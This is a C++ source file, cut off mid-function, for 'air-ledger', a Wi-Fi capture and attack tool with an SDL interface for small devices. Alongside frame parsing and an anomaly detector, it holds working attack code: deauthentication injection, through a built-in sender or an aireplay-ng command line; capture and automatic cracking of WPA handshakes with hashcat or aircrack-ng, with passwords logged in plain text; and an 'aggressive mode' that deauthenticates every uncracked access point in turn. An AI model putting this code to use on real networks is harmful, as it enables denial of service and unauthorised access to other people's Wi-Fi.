#include "app.hpp"
#include "parser/radiotap.hpp"
#include "parser/dot11.hpp"
#include <chrono>
#include <cstdio>
#include <cstring>
#include <cstdlib>
#include <ctime>
#include <algorithm>
#include <sstream>
#include <unordered_set>
#include <thread>
#include <sys/stat.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <unistd.h>
#include <signal.h>
#include <pcap/pcap.h>

static bool resolve_exec_path(const char* name_or_path, std::string& out) {
    if (!name_or_path || !*name_or_path) return false;
    if (std::strchr(name_or_path, '/')) {
        if (::access(name_or_path, X_OK) == 0) {
            out = name_or_path;
            return true;
        }
        return false;
    }
    const char* path_env = std::getenv("PATH");
    if (!path_env || !*path_env) return false;
    std::string path(path_env);
    size_t pos = 0;
    while (true) {
        size_t next = path.find(':', pos);
        std::string dir = path.substr(pos, next == std::string::npos ? std::string::npos : next - pos);
        if (dir.empty()) dir = ".";
        std::string cand = dir + "/" + name_or_path;
        if (::access(cand.c_str(), X_OK) == 0) {
            out = cand;
            return true;
        }
        if (next == std::string::npos) break;
        pos = next + 1;
    }
    return false;
}

static std::string resolve_tool(const char* env_name, const char* default_name) {
    const char* ov = std::getenv(env_name);
    std::string p;
    if (ov && *ov) {
        if (resolve_exec_path(ov, p)) return p;
        return std::string(ov) + " (missing)";
    }
    if (resolve_exec_path(default_name, p)) return p;
    return std::string(default_name) + " (missing)";
}

static bool tool_missing(const std::string& resolved) {
    return resolved.find(" (missing)") != std::string::npos;
}

static const char* iw_bin() {
    const char* p = std::getenv("AIR_LEDGER_IW_BIN");
    return (p && *p) ? p : "iw";
}

static const char* aireplay_bin() {
    const char* p = std::getenv("AIR_LEDGER_AIREPLAY_BIN");
    return (p && *p) ? p : "aireplay-ng";
}

static bool is_beepy_profile(UiProfile p) {
    return p == UiProfile::Beepy || p == UiProfile::BeepyWindow;
}

static int autoscaled_font_size(int h, bool beepy_profile) {
    if (beepy_profile) return 14;
    // Small displays (e.g. 400x240) need slightly larger text for readability.
    if (h <= 260) return 13;
    return std::clamp(8 + h / 80, 9, 32);
}

static int sidebar_width_for(int font_size, int win_w, int win_h, bool beepy_profile) {
    if (beepy_profile) return std::min(font_size * 20, win_w * 34 / 100);
    // Keep more graph area on tiny displays so bottom notifications have room.
    int max_ratio = (win_w <= 500 || win_h <= 300) ? (win_w * 36 / 100) : (win_w * 2 / 5);
    return std::min(font_size * 22, max_ratio);
}

static bool starts_with(const std::string& s, const char* pfx) {
    return s.rfind(pfx, 0) == 0;
}

// Candidate font paths to try (bundled font is tried first)
static const char* FONT_PATHS[] = {
    // Bundled with air-ledger (installed by Yocto recipe)
    "/usr/share/air-ledger/fonts/LiberationMono-Regular.ttf",
    // Fedora / Adwaita (installed by default on Fedora 43)
    "/usr/share/fonts/adwaita-mono-fonts/AdwaitaMono-Regular.ttf",
    // Liberation (various distro paths)
    "/usr/share/fonts/liberation-mono-fonts/LiberationMono-Regular.ttf",
    "/usr/share/fonts/liberation/LiberationMono-Regular.ttf",
    "/usr/share/fonts/truetype/liberation/LiberationMono-Regular.ttf",
    "/usr/share/fonts/liberation-mono/LiberationMono-Regular.ttf",
    // DejaVu
    "/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf",
    "/usr/share/fonts/dejavu/DejaVuSansMono.ttf",
    "/usr/share/fonts/TTF/DejaVuSansMono.ttf",
    // FreeMono
    "/usr/share/fonts/truetype/freefont/FreeMono.ttf",
    "/usr/share/fonts/gnu-free/FreeMono.ttf",
    nullptr
};

App::~App() {
    stop();
    if (capture_thread_.joinable())
        capture_thread_.join();
    db_.flush_batch();
    if (font_)     TTF_CloseFont(font_);
    if (renderer_) SDL_DestroyRenderer(renderer_);
    if (window_)   SDL_DestroyWindow(window_);
    TTF_Quit();
    SDL_Quit();
}

uint64_t App::now_us() {
    using namespace std::chrono;
    return static_cast<uint64_t>(
        duration_cast<microseconds>(system_clock::now().time_since_epoch()).count());
}

bool App::load_font() {
    // If we already know which font file to use, reload it directly.
    if (!font_path_.empty()) {
        font_ = TTF_OpenFont(font_path_.c_str(), font_size_);
        if (font_) return true;
    }
    for (int i = 0; FONT_PATHS[i]; ++i) {
        font_ = TTF_OpenFont(FONT_PATHS[i], font_size_);
        if (font_) {
            TTF_SetFontHinting(font_, TTF_HINTING_MONO);
            font_path_ = FONT_PATHS[i];
            std::fprintf(stderr, "[app] Loaded font: %s  size=%d\n", FONT_PATHS[i], font_size_);
            return true;
        }
    }
    std::fprintf(stderr, "[app] Warning: no font loaded — text will not render\n");
    return false;
}

void App::resize_font(int delta) {
    int new_size = std::clamp(font_size_ + delta, 6, 40);
    if (new_size == font_size_) return;
    font_size_ = new_size;
    int win_w = 0, win_h = 0;
    SDL_GetWindowSize(window_, &win_w, &win_h);
    bool beepy = is_beepy_profile(ui_profile_);
    sidebar_w_ = sidebar_width_for(font_size_, win_w, win_h, beepy);
    if (font_) { TTF_CloseFont(font_); font_ = nullptr; }
    load_font();  // TTF_HINTING_MONO set inside load_font
    graph_view_.set_font(font_);
    sidebar_.set_font(font_);
    int gw = win_w - sidebar_w_;
    graph_view_.set_viewport(0, 0, gw, win_h);
    layout_.set_bounds(static_cast<float>(gw), static_cast<float>(win_h));
    std::fprintf(stderr, "[app] font: %dpx  sidebar: %dpx\n", font_size_, sidebar_w_);
}

bool App::init(const std::string& iface, const std::string& db_path) {
    iface_name_ = iface;
    // SDL init
    if (SDL_Init(SDL_INIT_VIDEO) < 0) {
        std::fprintf(stderr, "[app] SDL_Init: %s\n", SDL_GetError());
        return false;
    }
    if (TTF_Init() < 0) {
        std::fprintf(stderr, "[app] TTF_Init: %s\n", TTF_GetError());
        return false;
    }

    Uint32 win_flags = 0;
    int win_w = WIN_W;
    int win_h = WIN_H;
    if (ui_profile_ == UiProfile::Beepy) {
        win_flags = SDL_WINDOW_FULLSCREEN_DESKTOP;
        win_w = 0;
        win_h = 0;
    } else if (ui_profile_ == UiProfile::BeepyWindow) {
        win_flags = 0;
        win_w = 400;
        win_h = 240;
    } else {
        win_flags = SDL_WINDOW_RESIZABLE;
    }
    window_ = SDL_CreateWindow("air-ledger",
                               SDL_WINDOWPOS_UNDEFINED, SDL_WINDOWPOS_UNDEFINED,
                               win_w, win_h, win_flags);
    if (!window_) {
        std::fprintf(stderr, "[app] SDL_CreateWindow: %s\n", SDL_GetError());
        return false;
    }

    // Surface-based rendering — works on JDI/KMS displays (e.g. Beepy).
    // SDL_CreateSoftwareRenderer lets us keep the SDL_Renderer API unchanged
    // while rendering to the window surface via SDL_UpdateWindowSurface.
    SDL_Surface* win_surface = SDL_GetWindowSurface(window_);
    if (!win_surface) {
        std::fprintf(stderr, "[app] SDL_GetWindowSurface: %s\n", SDL_GetError());
        return false;
    }
    renderer_ = SDL_CreateSoftwareRenderer(win_surface);
    if (!renderer_) {
        std::fprintf(stderr, "[app] SDL_CreateSoftwareRenderer: %s\n", SDL_GetError());
        return false;
    }

    SDL_SetRenderDrawBlendMode(renderer_, SDL_BLENDMODE_BLEND);

    // Auto-scale font to screen size: comfortable on both Beepy (240px) and desktop
    int actual_w = win_surface->w;
    int actual_h = win_surface->h;
    bool beepy = is_beepy_profile(ui_profile_);
    font_size_ = autoscaled_font_size(actual_h, beepy);
    sidebar_w_ = sidebar_width_for(font_size_, actual_w, actual_h, beepy);

    load_font();

    // Init UI components using actual window size (fullscreen → real display dims)
    const char* ui_profile_name =
        ui_profile_ == UiProfile::Beepy ? "beepy" :
        ui_profile_ == UiProfile::BeepyWindow ? "beepy-window" : "auto";
    std::fprintf(stderr, "[app] display: %dx%d  font: %dpx  ui_profile=%s\n",
                 actual_w, actual_h, font_size_, ui_profile_name);
    int graph_w = actual_w - sidebar_w_;
    int graph_h = actual_h;
    graph_view_.init(renderer_, font_);
    graph_view_.set_viewport(0, 0, graph_w, graph_h);

    sidebar_.init(renderer_, font_);
    layout_.set_bounds(static_cast<float>(graph_w), static_cast<float>(graph_h));

    // DB
    if (!db_.open(db_path)) {
        std::fprintf(stderr, "[app] Failed to open DB: %s\n", db_path.c_str());
        return false;
    }
    db_.create_schema();
    db_.load_graph(graph_);
    last_saved_node_count_ = graph_.nodes().size();

    // Resolve and print external utilities once at startup.
    std::string hc = resolve_tool("AIR_LEDGER_HASHCAT_BIN", "hashcat");
    std::string ac = resolve_tool("AIR_LEDGER_AIRCRACK_BIN", "aircrack-ng");
    std::string ar = resolve_tool("AIR_LEDGER_AIREPLAY_BIN", "aireplay-ng");
    std::string iw = resolve_tool("AIR_LEDGER_IW_BIN", "iw");
    std::fprintf(stderr, "[tools] hashcat:   %s\n", hc.c_str());
    std::fprintf(stderr, "[tools] aircrack:  %s\n", ac.c_str());
    std::fprintf(stderr, "[tools] aireplay:  %s\n", ar.c_str());
    std::fprintf(stderr, "[tools] iw:        %s\n", iw.c_str());
    push_notice("tool hashcat: " + hc, 8'000'000ULL);
    push_notice("tool aircrack: " + ac, 8'000'000ULL);
    push_notice("tool aireplay: " + ar, 8'000'000ULL);
    push_notice("tool iw: " + iw, 8'000'000ULL);

    // Capture
    capture_ = std::make_unique<PcapSource>();
    bool cap_ok = capture_->open(iface, [this](RawFrame f) {
        std::lock_guard<std::mutex> lk(frame_queue_mutex_);
        // Limit queue size to avoid memory explosion
        if (frame_queue_.size() < 5000)
            frame_queue_.push(std::move(f));
    });
    if (!cap_ok) {
        std::fprintf(stderr, "[app] Failed to open capture on '%s'\n", iface.c_str());
        push_error("Capture failed: " + iface);
    }

    running_.store(true);

    if (cap_ok) {
        capture_thread_ = std::thread([this]() {
            capture_->start();
        });
        // Create hopper (user enables with 'h'); pre-set iface so lock_channel works
        // even before hopping is started (e.g. channel-lock on AP selection).
        hopper_ = std::make_unique<ChannelHopper>();
        hopper_->set_iface(iface);
    }
    update_iface_diagnostics();

    return true;
}

void App::init_handshake(const HandshakeConfig& cfg) {
    handshake_saver_.configure(cfg);
    passwords_file_   = cfg.passwords_file;
    startup_wordlists_ = cfg.wordlists; // save for startup diagnostic
    // Create parent directory for passwords file if needed
    if (!passwords_file_.empty()) {
        auto slash = passwords_file_.rfind('/');
        if (slash != std::string::npos && slash > 0) {
            std::string dir = passwords_file_.substr(0, slash);
            ::mkdir(dir.c_str(), 0755);
        }
    }
    // Count passwords already in DB
    for (auto& [id, n] : graph_.nodes())
        if (n.type == NodeType::AP && !n.password.empty()) ++pw_count_;
    if (handshake_saver_.is_active())
        std::fprintf(stderr, "[app] handshake capture → %s  wordlists=%zu  auto-crack=%s\n",
                     cfg.capture_dir.c_str(), cfg.wordlists.size(),
                     cfg.auto_crack ? "yes" : "no");
}

void App::toggle_auto_crack() {
    if (!handshake_saver_.is_active()) {
        push_warning("Auto-crack toggle ignored: handshake capture is OFF");
        return;
    }
    bool en = !handshake_saver_.auto_crack_enabled();
    handshake_saver_.set_auto_crack(en);
    push_notice(std::string("Auto-crack ") + (en ? "ON" : "OFF"), 4'000'000ULL);
    std::fprintf(stderr, "[app] auto-crack %s\n", en ? "ENABLED" : "DISABLED");
}

void App::stop() {
    running_.store(false);
    if (capture_) capture_->stop();
}

void App::process_pending_frames() {
    // Drain queue in batches
    std::vector<RawFrame> batch;
    batch.reserve(200);
    {
        std::lock_guard<std::mutex> lk(frame_queue_mutex_);
        while (!frame_queue_.empty() && batch.size() < 200) {
            batch.push_back(std::move(frame_queue_.front()));
            frame_queue_.pop();
        }
    }

    total_frames_ += batch.size();

    for (auto& raw : batch) {
        if (raw.data.empty()) continue;

        const uint8_t* data = raw.data.data();
        size_t len = raw.data.size();

        // Parse radiotap
        int8_t rssi = raw.rssi;
        uint16_t freq = raw.freq_mhz;
        uint16_t rt_len = 0;
        bool has_rt = (len >= 8 && data[0] == 0);
        if (has_rt) {
            parse_radiotap(data, len, rssi, freq, rt_len);
        }

        if (rt_len >= len) continue;
        const uint8_t* dot11 = data + rt_len;
        size_t dot11_len = len - rt_len;

        ParsedFrame pf;
        pf.ts_us   = raw.ts_us;
        pf.rssi    = rssi;
        pf.channel = raw.channel;

        if (!parse_dot11(dot11, dot11_len, pf)) {
            ++stats_unparsed_;
            continue;
        }

        // Feed anomaly detector on every successfully parsed frame
        anomaly_detector_.process(pf, graph_, pf.ts_us);

        switch (pf.kind) {
            case FrameKind::Beacon:        ++stats_beacon_; break;
            case FrameKind::ProbeRequest:  ++stats_probe_req_; break;
            case FrameKind::ProbeResponse: ++stats_probe_resp_; break;
            case FrameKind::Auth:          ++stats_auth_; break;
            case FrameKind::Deauth:        ++stats_deauth_; break;
            case FrameKind::AssocRequest:  ++stats_assoc_req_; break;
            case FrameKind::AssocResponse: ++stats_assoc_resp_; break;
            case FrameKind::Data: {
                uint32_t prev_edges = stats_assoc_edges_;
                if (pf.ds_flags == 1)      ++stats_data_tods_;
                else if (pf.ds_flags == 2) ++stats_data_fromds_;
                else                       ++stats_data_other_;

                // Debug: print first 10 data frames + every 200th + all FromDS EAPOL candidates
                uint32_t data_total = stats_data_tods_ + stats_data_fromds_ + stats_data_other_;
                if (data_total <= 10 || data_total % 200 == 0 || pf.ds_flags == 2) {
                    std::fprintf(stderr,
                        "[data#%u] ds=%d eapol=%d msg=%u  bssid=%s  src=%s  dst=%s\n",
                        data_total, pf.ds_flags, pf.is_eapol ? 1 : 0, pf.eapol_msg,
                        pf.bssid.to_string().c_str(),
                        pf.src.to_string().c_str(),
                        pf.dst.to_string().c_str());
                }
                graph_.process_frame(pf);
                // Log when a new/updated AssociatedWith edge appears
                uint32_t new_edges = graph_.assoc_edge_count();
                if (new_edges > stats_assoc_edges_) {
                    stats_assoc_edges_ = new_edges;
                    std::fprintf(stderr,
                        "[assoc] new edge — total AssociatedWith: %u\n", new_edges);
                }
                (void)prev_edges;
                // Feed EAPOL frames to handshake saver
                if (pf.is_eapol) {
                    std::fprintf(stderr, "[eapol] bssid=%s  src=%s  M%u\n",
                        pf.bssid.to_string().c_str(),
                        pf.src.to_string().c_str(),
                        pf.eapol_msg);
                    handshake_saver_.feed(raw, pf);
                    // Mark whichever MAC is a known client as having a handshake
                    // and ensure AssociatedWith edge to the AP exists
                    std::string bssid_str = pf.bssid.to_string();
                    NodeId ap_id = 0;
                    for (auto& [aid, an] : graph_.nodes()) {
                        if (an.type == NodeType::AP && an.label == bssid_str) {
                            ap_id = aid;
                            break;
                        }
                    }
                    for (auto& [id, n] : graph_.nodes()) {
                        if (n.type != NodeType::Client) continue;
                        if (n.label == pf.src.to_string() || n.label == pf.dst.to_string()) {
                            n.has_handshake = true;
                            if (ap_id != 0) {
                                n.handshake_aps.insert(ap_id);
                                graph_.add_associated(id, ap_id, pf.ts_us);
                            }
                        }
                    }
                }
                continue; // already called process_frame above
            }
            default: break;
        }

        graph_.process_frame(pf);
        db_.insert_observation(pf);
        // Feed beacons/probe-responses so saver knows AP SSIDs
        handshake_saver_.feed(raw, pf);
    }

    // Drain anomaly detector events, persist to DB and update graph nodes
    for (auto& ev : anomaly_detector_.drain()) {
        db_.save_anomaly(ev);
        // Prepend to in-memory log (newest first, capped at max)
        anomaly_log_.insert(anomaly_log_.begin(), ev);
        if (anomaly_log_.size() > ANOMALY_LOG_MAX)
            anomaly_log_.resize(ANOMALY_LOG_MAX);
        // Update anomaly_count on matching graph nodes
        for (auto& [id, n] : graph_.nodes()) {
            if (n.label == ev.src_mac || n.label == ev.target_mac)
                n.anomaly_count++;
        }
        // Show notification for critical events
        if (ev.severity >= 3) {
            push_error(std::string("[!] ") + ev.description);
        }
    }
}

void App::run_analytics() {
    // Print frame type stats to stderr for diagnostics
    size_t n_clients = 0, n_aps = 0, n_ssids = 0;
    for (auto& [id, n] : graph_.nodes()) {
        if (n.type == NodeType::Client) ++n_clients;
        else if (n.type == NodeType::AP) ++n_aps;
        else if (n.type == NodeType::SSID) ++n_ssids;
    }
    const char* hop_state = hopping_enabled_ ? "ON" : "OFF";
    int cur_ch = (hopper_ && hopping_enabled_) ? hopper_->current_channel() : 0;
    std::fprintf(stderr,
        "[stats] hop=%s ch=%d  frames=%llu"
        "  bcn=%u  prb=%u  auth=%u  deauth=%u  assocReq=%u  assocResp=%u"
        "  data(T=%u F=%u O=%u)  unparsed=%u"
        "  |  clients=%zu  APs=%zu  SSIDs=%zu  assoc_edges=%u\n",
        hop_state, cur_ch,
        static_cast<unsigned long long>(total_frames_),
        stats_beacon_, stats_probe_req_,
        stats_auth_, stats_deauth_, stats_assoc_req_, stats_assoc_resp_,
        stats_data_tods_, stats_data_fromds_, stats_data_other_,
        stats_unparsed_,
        n_clients, n_aps, n_ssids, stats_assoc_edges_);

    RelationBuilder rb(graph_);
    rb.compute_all_similarities();

    // Update assoc_ap_count for each client node
    for (auto& [id, n] : graph_.nodes()) {
        if (n.type != NodeType::Client) continue;
        int cnt = 0;
        for (auto& e : graph_.edges())
            if (e.type == EdgeType::AssociatedWith
                    && (e.a == id || e.b == id)) ++cnt;
        n.assoc_ap_count = cnt;
    }

    // Save newly captured handshakes to DB for offline cracking
    for (auto& h : handshake_saver_.drain_new_handshakes()) {
        db_.save_handshake(h.bssid, h.ssid, h.hs, h.pcap_path);
        // Count stored handshakes and show in notification
        int n = db_.handshake_count(h.bssid);
        std::string label = h.ssid.empty() ? h.bssid : h.ssid;
        push_notice("HS#" + std::to_string(n) + ": " + label, 6'000'000ULL);
    }

    // Check if cracker has found any passwords (or exhausted the wordlist)
    for (auto& r : handshake_saver_.poll_results()) {
        if (r.found) {
            // Save to DB (both compat column and ap_passwords table)
            db_.add_ap_password(r.bssid, r.password);
            db_.set_ap_password(r.bssid, r.password);
            db_.update_handshake_crack(r.bssid, "found", r.password);
            // Update in-memory graph node
            for (auto& [id, n] : graph_.nodes()) {
                if (n.type == NodeType::AP && n.label == r.bssid) {
                    n.password = r.password;
                    // Add to passwords vector if not already present
                    if (std::find(n.passwords.begin(), n.passwords.end(), r.password) == n.passwords.end())
                        n.passwords.push_back(r.password);
                    break;
                }
            }
            ++pw_count_;
            // Append to plain-text passwords log
            if (!passwords_file_.empty()) {
                std::string ssid;
                for (auto& [id, n] : graph_.nodes())
                    if (n.type == NodeType::AP && n.label == r.bssid && n.ssid_id != 0)
                        if (const Node* sn = graph_.get_node(n.ssid_id)) { ssid = sn->label; break; }
                std::ofstream pf(passwords_file_, std::ios::app);
                if (pf) pf << r.bssid << "\t" << ssid << "\t" << r.password << "\n";
            }
            push_notice("PW: " + r.bssid + " = " + r.password, 10'000'000ULL);
            std::fprintf(stderr, "[app] password saved: %s → '%s'\n",
                         r.bssid.c_str(), r.password.c_str());
        } else {
            // Wordlist exhausted — no key found
            db_.update_handshake_crack(r.bssid, "not_found", "");
            for (auto& [id, n] : graph_.nodes()) {
                if (n.type == NodeType::AP && n.label == r.bssid) {
                    n.crack_not_found = true;
                    break;
                }
            }
            std::string label = r.ssid.empty() ? r.bssid : r.ssid;
            push_notice("No key: " + label, 8'000'000ULL);
            std::fprintf(stderr, "[app] crack exhausted (no key): %s\n", r.bssid.c_str());
        }
    }

    for (auto& ev : handshake_saver_.drain_runtime_events()) {
        switch (ev.level) {
            case HandshakeSaver::RuntimeEvent::Level::Error:
                push_error(ev.text);
                break;
            case HandshakeSaver::RuntimeEvent::Level::Warning:
                push_warning(ev.text);
                break;
            default:
                push_notice(ev.text, 5'000'000ULL);
                break;
        }
    }
}

void App::handle_click(int sx, int sy) {
    // If click is in graph viewport, select node
    // (graph_view handles hover/drag; we need to read selected after event processing)
    // This is handled via graph_view_.selected_node()
}

void App::update_iface_diagnostics() {
    const char* iw = iw_bin();
    std::string cmd = std::string(iw) + " dev " + iface_name_ + " info 2>/dev/null";
    FILE* f = popen(cmd.c_str(), "r");
    if (!f) return;

    std::string type = "?";
    int channel = 0;
    std::string txp = "?";
    char line[512];
    while (std::fgets(line, sizeof(line), f)) {
        std::string s(line);
        while (!s.empty() && (s.back() == '\n' || s.back() == '\r')) s.pop_back();
        if (starts_with(s, "\ttype ") || starts_with(s, "type ")) {
            size_t p = s.find("type ");
            if (p != std::string::npos) type = s.substr(p + 5);
        } else if (starts_with(s, "\tchannel ") || starts_with(s, "channel ")) {
            size_t p = s.find("channel ");
            if (p != std::string::npos) {
                int ch = std::atoi(s.c_str() + static_cast<int>(p + 8));
                if (ch > 0) channel = ch;
            }
        } else if (starts_with(s, "\ttxpower ") || starts_with(s, "txpower ")) {
            size_t p = s.find("txpower ");
            if (p != std::string::npos) txp = s.substr(p + 8);
        }
    }
    pclose(f);
    iface_diag_type_ = type;
    iface_diag_channel_ = channel;
    iface_diag_txpower_ = txp;
}

void App::render_action_bar(int w, int h) {
    if (!renderer_ || !font_) return;
    int lh = TTF_FontHeight(font_);
    int bar_h = lh + 8;
    SDL_Rect bar{0, h - bar_h, w, bar_h};
    SDL_SetRenderDrawBlendMode(renderer_, SDL_BLENDMODE_NONE);
    SDL_SetRenderDrawColor(renderer_, 0, 0, 0, 255);
    SDL_RenderFillRect(renderer_, &bar);
    SDL_SetRenderDrawColor(renderer_, 80, 80, 80, 255);
    SDL_RenderDrawLine(renderer_, 0, h - bar_h, w, h - bar_h);

    bool compact = (w <= 500 || h <= 300 || is_beepy_profile(ui_profile_));
    std::string left;
    if (graph_view_.ap_list_visible()) left = compact ? "AP: Up/Dn Tab Enter d p/Esc" : "AP LIST: Up/Dn/Tab nav  Enter select  d deauth  p/Esc close";
    else if (graph_view_.crack_list_visible()) left = compact ? "CRK: Up/Dn Tab Enter k/Esc" : "CRACK: Up/Dn/Tab nav  Enter select AP  k/Esc close";
    else if (graph_view_.hs_list_visible()) left = compact ? "HS: Up/Dn Tab Enter j/Esc" : "HS: Up/Dn/Tab nav  Enter select client  j/Esc close";
    else if (graph_view_.anomaly_log_visible()) left = compact ? "WARN: Up/Dn Tab Enter w/Esc" : "ANOMALY: Up/Dn/Tab nav  Enter select src  w/Esc close";
    else if (graph_view_.event_log_visible()) left = compact ? "LOG: Up/Dn Tab y/Esc" : "EVENT LOG: Up/Dn/Tab nav  y/Esc close";
    else {
        if (compact) {
            uint32_t phase = (SDL_GetTicks() / 2500) % 3;
            if (phase == 0) left = "modes: p ap  k crk  j hs";
            else if (phase == 1) left = "modes: w warn  y log  i help";
            else left = "Tab nodes  d deauth  Ctrl+d diag  t crack";
        } else {
            left = "modes: p=AP  k=CRK  j=HS  w=WARN  y=LOG  i=help  d=deauth  Ctrl+d=diag  t=auto-crack  g=AGG(confirm)";
        }
    }

    std::string right = "AC:" + std::string(handshake_saver_.auto_crack_enabled() ? "on" : "off")
        + " CH:" + (iface_diag_channel_ > 0 ? std::to_string(iface_diag_channel_) : "?");

    auto draw_text = [&](const std::string& txt, int x, SDL_Color col) {
        SDL_Surface* s = TTF_RenderUTF8_Blended(font_, txt.c_str(), col);
        if (!s) return;
        SDL_Texture* t = SDL_CreateTextureFromSurface(renderer_, s);
        int tw = s->w, th = s->h;
        SDL_FreeSurface(s);
        if (!t) return;
        SDL_Rect dst{x, h - bar_h + 3, tw, th};
        SDL_RenderCopy(renderer_, t, nullptr, &dst);
        SDL_DestroyTexture(t);
    };

    int rw = 0, rh = 0;
    TTF_SizeUTF8(font_, right.c_str(), &rw, &rh);
    int max_left_w = std::max(20, w - rw - 16);
    std::string ltxt = left;
    while (!ltxt.empty()) {
        int tw = 0, th = 0;
        TTF_SizeUTF8(font_, ltxt.c_str(), &tw, &th);
        if (tw <= max_left_w) break;
        if (ltxt.size() <= 4) break;
        ltxt.pop_back();
    }
    if (ltxt.size() < left.size() && ltxt.size() > 2) {
        ltxt.back() = '~';
    }
    draw_text(ltxt, 4, {220, 220, 220, 255});
    draw_text(right, std::max(4, w - rw - 6), {255, 220, 60, 255});
}

void App::push_error(const std::string& msg) {
    std::fprintf(stderr, "[error] %s\n", msg.c_str());
    add_event_log(msg, {255, 60, 60, 255});
    notifications_.push_back({msg, true, now_us() + 5'000'000ULL});
}

void App::push_warning(const std::string& msg) {
    std::fprintf(stderr, "[warn] %s\n", msg.c_str());
    add_event_log(msg, {255, 220, 60, 255});
    notifications_.push_back({msg, false, now_us() + 4'000'000ULL});
}

void App::push_notice(const std::string& msg, uint64_t ttl_us) {
    add_event_log(msg, {0, 255, 100, 255});
    notifications_.push_back({msg, false, now_us() + ttl_us});
}

void App::add_event_log(const std::string& msg, SDL_Color color) {
    if (!event_log_.empty()) {
        auto& top = event_log_.front();
        bool same_color = (top.color.r == color.r && top.color.g == color.g
            && top.color.b == color.b && top.color.a == color.a);
        if (same_color && top.text == msg) {
            if (top.repeats < 999999) ++top.repeats;
            return;
        }
    }
    event_log_.insert(event_log_.begin(), {msg, color, 1});
    if (event_log_.size() > EVENT_LOG_MAX) event_log_.resize(EVENT_LOG_MAX);
}


void App::send_deauth(NodeId ap_id) {
    const Node* n = graph_.get_node(ap_id);
    if (!n || n->type != NodeType::AP) return;

    const std::string& bssid = n->label;
    int target_ch = n->channel;
    update_iface_diagnostics();

    // Lock channel BEFORE deauth so the card is on the right channel
    // when the AP sends M1 (the reconnection happens ~100-500ms after deauth).
    // The lock also serialises with the hopper thread via ch_mutex_ in set_channel().
    if (hopper_ && target_ch > 0) {
        if (hopper_->lock_channel(n->channel, n->chan_ht_oper)) {
            deauth_ch_unlock_us_ = now_us() + 5'000'000ULL; // 5 s — enough for full 4-way HS
            std::fprintf(stderr, "[deauth] channel locked to %d for 5s (pre-deauth)\n", n->channel);
        } else {
            push_warning("Channel lock failed for " + bssid + " (ch " + std::to_string(n->channel) + ")");
            std::fprintf(stderr, "[deauth] channel lock FAILED for %s ch=%d\n", bssid.c_str(), n->channel);
            return;
        }
    }
    // Hard channel-control gate before deauth.
    if (target_ch > 0 && iface_diag_channel_ > 0 && iface_diag_channel_ != target_ch) {
        push_warning("Deauth blocked: iface ch " + std::to_string(iface_diag_channel_)
            + " != target ch " + std::to_string(target_ch));
        std::fprintf(stderr, "[deauth] BLOCKED bssid=%s iface_ch=%d target_ch=%d\n",
                     bssid.c_str(), iface_diag_channel_, target_ch);
        return;
    }

    if (deauth_engine_ == DeauthEngine::Builtin) {
        std::thread([bssid, iface = iface_name_, this]() {
            if (!DeauthSender::send(iface, bssid, 5))
                push_error("Deauth inject failed: " + bssid);
        }).detach();
    } else {
        // Fallback: aireplay-ng in forked child
        const char* aireplay = aireplay_bin();
        std::fprintf(stderr, "[deauth] %s -0 5 -a %s %s\n",
                     aireplay, bssid.c_str(), iface_name_.c_str());
        signal(SIGCHLD, SIG_IGN);
        pid_t pid = fork();
        if (pid == 0) {
            int devnull = open("/dev/null", O_WRONLY);
            if (devnull >= 0) {
                dup2(devnull, STDOUT_FILENO);
                dup2(devnull, STDERR_FILENO);
                close(devnull);
            }
            const char* av[] = {
                aireplay, "-0", "5", "-a", bssid.c_str(),
                iface_name_.c_str(), nullptr
            };
            execvp(aireplay, const_cast<char* const*>(av));
            _exit(1);
        }
    }

    deauth_flash_until_us_ = now_us() + 2'000'000ULL;
}

void App::toggle_aggressive_mode() {
    if (aggressive_mode_) {
        aggressive_mode_ = false;
        aggr_arm_until_us_ = 0;
        aggr_target_label_.clear();
        push_warning("AGG MODE OFF");
        std::fprintf(stderr, "[aggr] aggressive mode DISABLED\n");
        return;
    }

    uint64_t now = now_us();
    if (aggr_arm_until_us_ == 0 || now > aggr_arm_until_us_) {
        aggr_arm_until_us_ = now + 3'000'000ULL;
        push_warning("Press G again in 3s to enable AGG mode");
        std::fprintf(stderr, "[aggr] arm requested (press G again to confirm)\n");
        return;
    }

    aggr_arm_until_us_ = 0;
    aggressive_mode_ = true;
    if (aggressive_mode_) {
        aggr_ap_idx_       = 0;
        aggr_next_us_      = 0; // fire immediately on first tick
        aggr_target_label_.clear();
        push_warning("AGG MODE ON — cyclic deauth active");
        std::fprintf(stderr, "[aggr] aggressive mode ENABLED\n");
    }
}

void App::run_inject_diagnostics(NodeId ap_id) {
    const Node* n = graph_.get_node(ap_id);
    if (!n || n->type != NodeType::AP) return;
    const std::string bssid = n->label;
    const int target_ch = n->channel;
    update_iface_diagnostics();
    std::fprintf(stderr, "[diag] inject start bssid=%s iface=%s iface_ch=%d target_ch=%d\n",
                 bssid.c_str(), iface_name_.c_str(), iface_diag_channel_, target_ch);
    push_notice("Inject diag: start " + bssid, 3'000'000ULL);

    if (hopper_ && target_ch > 0) {
        if (!hopper_->lock_channel(target_ch, n->chan_ht_oper)) {
            push_error("Inject diag: channel lock failed");
            return;
        }
    }
    if (target_ch > 0 && iface_diag_channel_ > 0 && iface_diag_channel_ != target_ch) {
        push_warning("Inject diag: channel mismatch after lock");
        return;
    }
    std::thread([this, bssid]() {
        bool ok = DeauthSender::send(iface_name_, bssid, 1);
        if (ok) push_notice("Inject diag: OK", 4'000'000ULL);
        else push_error("Inject diag: FAILED");
    }).detach();
}

void App::tick_aggressive_mode() {
    if (!aggressive_mode_) return;

    uint64_t now = now_us();
    if (now < aggr_next_us_) return;

    // Build sorted list of AP IDs eligible for deauth
    std::vector<NodeId> aps;
    for (auto& [id, n] : graph_.nodes()) {
        if (n.type != NodeType::AP) continue;

        // Skip: password already found
        if (!n.passwords.empty() || !n.password.empty()) continue;

        // Skip: crack job is Queued or Running (handshake captured, waiting/cracking)
        const CrackJob* job = handshake_saver_.find_job_ro(n.label);
        if (job) {
            using S = CrackJob::Status;
            if (job->status == S::Found || job->status == S::Queued || job->status == S::Running)
                continue;
            // NotFound → re-try deauth (fresh handshake may help with different wordlist later)
        }

        aps.push_back(id);
    }
    std::sort(aps.begin(), aps.end());

    if (aps.empty()) {
        // All APs have passwords or pending cracks — nothing to do, check again later
        aggr_target_label_ = "(all done)";
        aggr_next_us_ = now + 10'000'000ULL;
        return;
    }

    // Wrap index
    if (aggr_ap_idx_ >= static_cast<int>(aps.size())) aggr_ap_idx_ = 0;

    NodeId target = aps[aggr_ap_idx_];
    const Node* n = graph_.get_node(target);
